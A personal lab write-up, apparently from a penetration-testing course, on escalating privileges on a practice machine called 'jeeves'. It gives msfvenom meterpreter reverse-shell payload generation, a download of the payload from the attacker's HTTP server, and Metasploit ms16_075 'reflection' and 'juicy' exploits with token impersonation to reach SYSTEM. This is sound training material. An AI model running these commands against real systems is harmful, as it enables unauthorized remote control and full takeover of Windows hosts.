Got initial foothold as `jeeves\kohsuke`[[PNPT/WPE/Impersonation and Potato/Initial Foothold|Initial Foothold]]

# Checking Privileges
---
- `whoami /priv`
	- These two look cool:
	- ![[Pasted image 20250415150752.png]]

# Meterpreter Shell
---
Note: **we can use metasploit's web delivery as well**
- `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.19 LPORT=9002 -f exe -o reverse.exe`
- Not able to upload, so needed to get a powershell shell
	- I was not able to run powershell commands or open powershell from command prompt for some reason so used base64 encoded powershell reverse shell
		- ![[Pasted image 20250415153541.png]]

- Generate meterepreter file:
	- `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.19 LPORT=9002 -f exe -o reverse.exe`
- Start python3 server:
	- `python3 -m http.server`
- Transfer using powershell
	- `Invoke-WebRequest 10.10.14.19:8000/reverse.exe -OutFile reverse.exe`
- Start metasploit and run to get shell:
	- ![[Pasted image 20250415153655.png]]

# Metasploit Exploit Suggester
---
- `multi/recon/local_exploit_suggester`
	- ![[Pasted image 20250415155046.png]]


# ms16_075_reflection attack
---
- `use exploit/windows/local/ms16_075_reflection`
- `set lhost tun0`
- `set payload windows/x64/meterpreter/reverse_tcp`
- `set lport 9005`
- `set session 1`
- `run`
	- ![[Pasted image 20250415155855.png]]
	- `load incognito`
	- `list_tokens -u`
	- `impersonate NT AUTHORITY\\SYSTEM`
- Note: **This should have worked, but did not, so I used this instead:**
	- **`use exploit/windows/local/ms16_075_reflection_juicy`**
- ![[Pasted image 20250415162105.png]]

- ![[Pasted image 20250415162121.png]]

[[Alternate Data Streams]]